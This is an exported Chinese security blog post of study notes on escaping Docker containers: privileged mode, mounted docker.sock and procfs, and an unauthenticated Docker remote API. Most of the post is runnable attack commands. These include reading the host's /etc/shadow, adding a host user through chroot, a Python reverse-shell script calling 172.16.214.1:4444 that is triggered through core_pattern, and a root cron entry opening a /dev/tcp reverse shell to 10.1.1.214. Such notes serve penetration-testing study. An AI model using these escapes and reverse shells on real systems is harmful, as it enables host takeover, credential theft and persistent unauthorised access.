{"title":"云原生-docker","uid":"c1542731ca718f81298fabe69ac4f53f","slug":"云攻防-云原生-docker","date":"2025-05-17T08:28:23.756Z","updated":"2025-05-17T08:37:23.312Z","comments":true,"path":"api/articles/云攻防-云原生-docker.json","keywords":null,"cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/e6d0930a-5ea5-4a58-9282-8a97feff4efa.jpg","content":"<h1 id=\"云原生-docker\"><a href=\"#云原生-docker\" class=\"headerlink\" title=\"云原生-docker\"></a>云原生-docker</h1><p>拿到权限：判断是否为容器</p>\n<p><a href=\"https://blog.csdn.net/qq_23936389/article/details/131486643\">https://blog.csdn.net/qq_23936389/article/details/131486643</a></p>\n<p>三种安全容器逃逸：</p>\n<ul>\n<li>特权模式启动导致（不安全启动 适用于 java jsp 高权限无需提权 还要提权才能逃<br>逸）</li>\n<li>危险挂载启动导致（危险启动 适用于 java jsp 高权限无需提权 还要提权才能逃逸）<br>-docker 自身 &amp; 系统漏洞（软件漏洞和系统漏洞 都可用）<br><a href=\"https://wiki.teamssix.com/cloudnative/\">https://wiki.teamssix.com/cloudnative/</a></li>\n</ul>\n<h2 id=\"容器逃逸-特权模式\"><a href=\"#容器逃逸-特权模式\" class=\"headerlink\" title=\"容器逃逸 - 特权模式\"></a>容器逃逸 - 特权模式</h2><p><a href=\"https://wiki.teamssix.com/CloudNative/Docker/docker-privileged-escape.html\">https://wiki.teamssix.com/CloudNative/Docker/docker-privileged-escape.html</a></p>\n<p>启动 docker 容器：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run --rm --privileged=true -it alpine  //启用--privileged=true，container内的root拥有真正的root权限，可能让攻击者利用此进行容器逃逸</span><br></pre></td></tr></table></figure>\n<p>判断是否为容器环境：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /proc/1/cgroup | grep -qi docker &amp;&amp; echo &quot;Is Docker&quot; || echo &quot;Not Docker&quot;</span><br></pre></td></tr></table></figure>\n<p>如果返回 Is Docker，说明当前是 Docker 容器环境，反之亦然。</p>\n<p>判断特权模式：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /proc/self/status | grep -qi &quot;0000003fffffffff&quot; &amp;&amp; echo &quot;Is privileged mode&quot; || echo &quot;Not privileged mode&quot;</span><br><span class=\"line\">或者</span><br><span class=\"line\">cat /proc/self/status | grep CapEff </span><br></pre></td></tr></table></figure>\n<p>在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为 0000003fffffffff 或者是 0000001fffffffff</p>\n<p>方法一：</p>\n<p>查看挂载磁盘设备：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fdisk -l</span><br></pre></td></tr></table></figure>\n<p>在容器内部执行以下命令，将宿主机文件挂载到 &#x2F;test 目录下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir /test &amp;&amp; mount /dev/sda1 /test</span><br></pre></td></tr></table></figure>\n<p>尝试访问宿主机 shadow 文件，可以看到正常访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /test/etc/shadow</span><br></pre></td></tr></table></figure>\n<p>方法二</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mount /dev/sda1 /mnt</span><br><span class=\"line\">chroot /mnt adduser john</span><br></pre></td></tr></table></figure>\n<p>通过新添加的用户登录</p>\n<h2 id=\"容器逃逸-挂载-逃逸\"><a href=\"#容器逃逸-挂载-逃逸\" class=\"headerlink\" title=\"容器逃逸 - 挂载 逃逸\"></a>容器逃逸 - 挂载 逃逸</h2><p><a href=\"https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html\">https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html</a></p>\n<p>启动容器：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu //procfs</span><br><span class=\"line\">docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu //Socket</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"挂载-Docker-Socket-逃逸-：\"><a href=\"#挂载-Docker-Socket-逃逸-：\" class=\"headerlink\" title=\"挂载 Docker Socket 逃逸 ：\"></a>挂载 Docker Socket 逃逸 ：</h2><p>执行以下命令，如果返回 Docker Socket is mounted. 说明当前挂载了 Docker Socket</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls /var/run/ | grep -qi docker.sock &amp;&amp; echo &quot;Docker Socket is mounted.&quot; || echo &quot;Docker Socket is not mounted.&quot;</span><br><span class=\"line\">ls -lah /var/run/docker.sock</span><br></pre></td></tr></table></figure>\n<p>在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it -v /:/host ubuntu /bin/bash</span><br></pre></td></tr></table></figure>\n<p>在新的容器内执行 chroot，将根目录切换到挂载到宿主机的根目录</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chroot /host</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"挂载-procfs-逃逸-：\"><a href=\"#挂载-procfs-逃逸-：\" class=\"headerlink\" title=\"挂载 procfs 逃逸 ：\"></a>挂载 procfs 逃逸 ：</h2><p>执行以下命令，如果返回 Procfs is mounted. 说明当前挂载了 procfs</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -name core_pattern 2&gt;/dev/null | wc -l | grep -q 2 &amp;&amp; echo &quot;Procfs is mounted.&quot; || echo &quot;Procfs is not mounted.&quot;</span><br></pre></td></tr></table></figure>\n<p>如果找到两个 core_pattern 文件，那可能就是挂载了宿主机的 procfs</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -name core_pattern</span><br></pre></td></tr></table></figure>\n<p>找到当前容器在宿主机下的绝对路径</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /proc/mounts | xargs -d &#x27;,&#x27; -n 1 | grep workdir</span><br><span class=\"line\">//为绝对路/var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377d61fd6d17e11e49d1b1baad/merged</span><br></pre></td></tr></table></figure>\n<p>安装 vim 和 gcc</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get update -y &amp;&amp; apt-get install vim gcc -y</span><br><span class=\"line\">vim /tmp/.t.py</span><br></pre></td></tr></table></figure>\n<p>创建一个反弹 Shell 的 py 脚本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/usr/bin/python3</span></span><br><span class=\"line\">import  os</span><br><span class=\"line\">import pty</span><br><span class=\"line\">import socket</span><br><span class=\"line\">lhost = &quot;172.16.214.1&quot;</span><br><span class=\"line\">lport = 4444</span><br><span class=\"line\">def main():</span><br><span class=\"line\">   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">   s.connect((lhost, lport))</span><br><span class=\"line\">   os.dup2(s.fileno(), 0)</span><br><span class=\"line\">   os.dup2(s.fileno(), 1)</span><br><span class=\"line\">   os.dup2(s.fileno(), 2)</span><br><span class=\"line\">   os.putenv(&quot;HISTFILE&quot;, &#x27;/dev/null&#x27;)</span><br><span class=\"line\">   pty.spawn(&quot;/bin/bash&quot;)</span><br><span class=\"line\"><span class=\"meta prompt_\">   # </span><span class=\"language-bash\">os.remove(<span class=\"string\">&#x27;/tmp/.t.py&#x27;</span>)</span></span><br><span class=\"line\">   s.close()</span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">   main()</span><br></pre></td></tr></table></figure>\n<p>给 Shell 赋予执行权限</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 777 .t.py</span><br></pre></td></tr></table></figure>\n<p>写入反弹 shell 到目标的 proc 目录下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo -e &quot;|/var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377d61fd6d17e11e49d1b1baad/merged/tmp/.t.py \\rcore    &quot; &gt;  /host/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>\n<p>在攻击主机上开启一个监听，然后在容器里运行一个可以崩溃的程序</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim t.c</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">include&lt;stdio.h&gt;</span></span><br><span class=\"line\">int main(void)  &#123;</span><br><span class=\"line\">   int *a  = NULL;</span><br><span class=\"line\">   *a = 1;</span><br><span class=\"line\">   return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">gcc t.c -o t</span><br><span class=\"line\">./t</span><br></pre></td></tr></table></figure>\n<h2 id=\"Docker-远程-API-未授权访问逃逸\"><a href=\"#Docker-远程-API-未授权访问逃逸\" class=\"headerlink\" title=\"Docker 远程 API 未授权访问逃逸\"></a>Docker 远程 API 未授权访问逃逸</h2><p>docker remote api 可以执行 docker 命令，docker 守护进程监听在 0.0.0.0，可直接调用 API 来操作 docker</p>\n<p>将 docker 守护进程监听在 0.0.0.0</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</span><br></pre></td></tr></table></figure>\n<p>检测：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IP=`hostname -i | awk -F. &#x27;&#123;print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.1&quot;&#125;&#x27; ` &amp;&amp; wget http://$IP:2375</span><br></pre></td></tr></table></figure>\n<p>如果返回 404 说明存在</p>\n<p>列出容器信息</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl http://&lt;target&gt;:2375/containers/json</span><br></pre></td></tr></table></figure>\n<p>查看容器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker -H tcp://&lt;target&gt;:2375 ps -a</span><br></pre></td></tr></table></figure>\n<p>新运行一个容器，挂载点设置为服务器的根目录挂载至 &#x2F;mnt 目录下。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash</span><br></pre></td></tr></table></figure>\n\n<p>在容器内执行命令，将反弹 shell 的脚本写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.1.1.214/12345 0&gt;&amp;1&#x27; &gt;&gt; /mnt/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>\n<p>本地监听端口，获取对方宿主机 shell。</p>\n","feature":true,"text":"云原生-docker拿到权限：判断是否为容器 https://blog.csdn.net/qq_23936389/article/details/1314866...","permalink":"/post/云攻防-云原生-docker","photos":[],"count_time":{"symbolsCount":"4k","symbolsTime":"4 mins."},"categories":[{"name":"云安全","slug":"云安全","count":3,"path":"api/categories/云安全.json"}],"tags":[{"name":"云安全","slug":"云安全","count":3,"path":"api/tags/云安全.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%91%E5%8E%9F%E7%94%9F-docker\"><span class=\"toc-text\">云原生-docker</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8-%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F\"><span class=\"toc-text\">容器逃逸 - 特权模式</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8-%E6%8C%82%E8%BD%BD-%E9%80%83%E9%80%B8\"><span class=\"toc-text\">容器逃逸 - 挂载 逃逸</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%8C%82%E8%BD%BD-Docker-Socket-%E9%80%83%E9%80%B8-%EF%BC%9A\"><span class=\"toc-text\">挂载 Docker Socket 逃逸 ：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%8C%82%E8%BD%BD-procfs-%E9%80%83%E9%80%B8-%EF%BC%9A\"><span class=\"toc-text\">挂载 procfs 逃逸 ：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Docker-%E8%BF%9C%E7%A8%8B-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E9%80%83%E9%80%B8\"><span class=\"toc-text\">Docker 远程 API 未授权访问逃逸</span></a></li></ol></li></ol>","author":{"name":"Hao","slug":"blog-author","avatar":"https://i.pinimg.com/736x/64/96/6b/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"个人网络安全博客","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"云攻防-K8S安全","uid":"aa2cc9f18c0295fd4c228dc62555a6a1","slug":"云攻防-K8S安全","date":"2025-05-17T08:38:05.197Z","updated":"2025-05-17T09:17:36.613Z","comments":true,"path":"api/articles/云攻防-K8S安全.json","keywords":null,"cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/6f0ed8a7-9402-4c93-84ed-727d54681967.jpg","text":"云攻防-K8S安全Kubernetes 是一个开源的，用于编排云平台中多个主机上的容器化的应用，目标是让部署容器化的应用能简单并且高效的使用，提供了应用部署，规...","permalink":"/post/云攻防-K8S安全","photos":[],"count_time":{"symbolsCount":"8.6k","symbolsTime":"8 mins."},"categories":[{"name":"云安全","slug":"云安全","count":3,"path":"api/categories/云安全.json"}],"tags":[{"name":"云安全","slug":"云安全","count":3,"path":"api/tags/云安全.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://i.pinimg.com/736x/64/96/6b/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"个人网络安全博客","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"Java安全学习路径","uid":"7c3e14f0681c54989a322aaf4933843e","slug":"Java安全学习路线","date":"2025-05-17T07:27:11.184Z","updated":"2025-05-17T09:15:50.655Z","comments":true,"path":"api/articles/Java安全学习路线.json","keywords":null,"cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%23chudia%20%23anime%20%23wataa%20%23girl%20%23wlw.jpg","text":"参考文章： https://github.com/HackJava/HackJava ","permalink":"/post/Java安全学习路线","photos":[],"count_time":{"symbolsCount":43,"symbolsTime":"1 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":4,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java安全","slug":"Java安全","count":4,"path":"api/tags/Java安全.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://i.pinimg.com/736x/64/96/6b/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"个人网络安全博客","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}